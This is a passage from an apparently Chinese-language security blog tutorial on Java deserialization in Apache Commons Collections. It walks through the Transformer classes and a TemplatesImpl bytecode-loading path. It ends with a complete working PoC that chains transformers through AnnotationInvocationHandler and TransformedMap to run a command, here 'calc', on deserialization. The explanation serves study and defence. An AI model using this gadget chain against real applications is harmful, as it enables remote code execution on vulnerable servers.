class="comment">// 如果输入为null，直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取输入对象的类类型</span></span><br><span class="line">        Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取目标方法，根据方法名和参数类型</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用该方法并返回结果</span></span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果方法不存在，抛出自定义异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果方法无法访问，抛出自定义异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果方法调用抛出异常，抛出自定义异常，并传递原始异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p><code>InstantiateTransformer</code> 会把传入的 <code>input</code> 看做是一个 <code>Class</code> 对象，然后调用其对应的构造函数并传入指定参数来实例化一个对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  构造方法的参数类型数组，参数不会被复制</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  构造方法的参数数组，参数不会被复制</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过实例化输入的Class对象来将其转换为结果。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  要转换的输入对象，应该是一个Class对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 转换后的结果，即通过实例化Class对象创建的实例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 检查输入是否是Class对象</span></span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取Class对象的构造方法，并使用指定的参数类型</span></span><br><span class="line">        Constructor&lt;?&gt; con = ((Class&lt;?&gt;) input).getConstructor(iParamTypes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用构造方法实例化对象，并返回结果</span></span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果构造方法不存在，抛出自定义异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果实例化失败，抛出自定义异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果构造方法不可访问，抛出自定义异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果构造方法抛出异常，抛出自定义异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code> 也是实现了 <code>Transformer</code> 接口的</p>
<p>一个类，它的作用是将内部的多个 <code>Transformer</code> 串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/ChainedTransformer.svg"
                      alt="ChainedTransformer"
                ></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> transformers  要链式调用的 transformers 数组，参数不会被复制，且不能包含 null 值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过链式调用每个 transformer，将输入对象转换为结果。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  传递给第一个 transformer 的输入对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 转换后的结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="comment">// 按顺序依次通过每个 transformer 进行转换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;  <span class="comment">// 返回最终的转换结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Transformer-构造代码执行流"><a href="#Transformer-构造代码执行流" class="headerlink" title="Transformer 构造代码执行流"></a>Transformer 构造代码执行流</h3><h4 id="构造任意代码执行"><a href="#构造任意代码执行" class="headerlink" title="构造任意代码执行"></a>构造任意代码执行</h4><p>根据前面对 <code>Transformer</code> 的介绍，我们可以将 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 拆解为 <code>runtime = Runtime.getRuntime()</code> 和 <code>runtime.exec(&quot;calc&quot;)</code> 两部分，因而有如下构造：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<p>然而由于 <code>Runtime</code> 对象没有实现 <code>Serializable</code> 接口，因此 <code>transformerChain</code> 对象是无法序列化的，因此我们还要把 <code>Runtime.getRuntime()</code> 拆解为 <code>getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;)</code> 和 <code>getRuntime.invoke(null)</code>。</p>
<p>由于 <code>InvokerTransformer</code> 内部会对传入的方法调用 <code>getMethod</code> 查找，因此构造 <code>InvokerTransformer</code> 时传入的参数类型需要严格按照传入的方法名对应的方法的定义来，且参数要和参数类型数量严格对应，这就是为什么实际上我们构造的是 <code>Runtime.class.getMethod(&quot;getRuntime&quot;, null)</code> 和 <code>getRuntime.invoke(null, null)</code>（新添加的 <code>null</code> 表示类型或参数数组）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<h4 id="构造任意字节码加载"><a href="#构造任意字节码加载" class="headerlink" title="构造任意字节码加载"></a>构造任意字节码加载</h4><p><code>TemplatesImpl</code> 加载任意字节码有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>

<p>因此我们只需要想办法让程序执行流程能够到达这个调用栈中任意一个函数即可，例如 <code>newTransformer</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="相关利用链"><a href="#相关利用链" class="headerlink" title="相关利用链"></a>相关利用链</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/5a4d01c1d0904b5c8444ceaa2cf42198-1735752042713-1.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"><a href="#CommonsCollections0（AnnotationInvocationHandler→TransformedMap）" class="headerlink" title="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"></a>CommonsCollections0（AnnotationInvocationHandler→TransformedMap）</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 中的 <code> memberValue.setValue</code> 会调用 <code>setValue</code> 方法，进而会调用到 <code>memberValues</code> 的 <code>transformer</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();  <span class="comment">// 读取默认的对象数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取注解类型的成员类型（即注解的字段类型）</span></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果注解成员没有值，该情况由 invoke 方法处理</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  <span class="comment">// 获取成员的名称</span></span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);  <span class="comment">// 获取该成员的类型</span></span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// 如果该成员仍然存在</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();  <span class="comment">// 获取成员的值</span></span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||  <span class="comment">// 如果值不符合类型要求</span></span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 如果类型不匹配，创建 AnnotationTypeMismatchExceptionProxy 异常代理</span></span><br><span class="line">                memberValue.setValue( <span class="comment">// &lt;-- 调用了 setValue 方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>)  <span class="comment">// 异常信息包括值的类和字符串表示</span></span><br><span class="line">                    .setMember(annotationType.members().get(name)));  <span class="comment">// 设置成员信息</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不过这里需要绕过 <code>memberType != null</code> 判断，根据调试可知：</p>
<ul>
<li><code>memberTypes</code> 中的 <code>key</code> 是构造时传入的 <code>type</code> 对应的类中的所有方法名字符串。</li>
<li><code>name</code> 是构造时传入的 <code>memberValues</code> 中的某个 <code>key</code>。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() || <span class="comment">//  `type` 还要继承自 `Annotation`</span></span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type; <span class="comment">//  `memberTypes` 中的 `key` 是构造时传入的 `type` 对应的类中的所有方法名字符串</span></span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues; <span class="comment">// `name` 是构造时传入的 `memberValues` 中的某个 `key`。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>又因为 <code>type</code> 还要继承自 <code>Annotation</code>，因此因此我们构造 <code>AnnotationInvocationHandler</code> 的时候 <code>type</code> 选择 <code>Retention.class</code> 。</p>
<blockquote>
<p><code>@Retention</code> 本身是一个<strong>元注解</strong>，意味着它是用来注解其他注解的。<code>@Retention</code> 的设计也遵循了 Java 注解的规范：每个注解类型都继承自 <code>Annotation</code> 接口，这保证了注解类型的一致性。</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the retention policy.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the retention policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>; <span class="comment">// 构造 `AnnotationInvocationHandler` 的时候 `type` 选择 `Retention.class` ，这样 `memberTypes` 中的键就有一个 `value` 字符串。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为 <code>Retention</code> 中有一个 <code>value</code> 方法，因此 <code>memberTypes</code> 会有一个 <code>value</code> 字符串的键。我们预先在 <code>memberValues</code> 中存一个 <code>value</code> 字符串的键，反序列化的时候就可以执行到 <code>setValue</code> 方法。</p>
<p>完整 poc 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
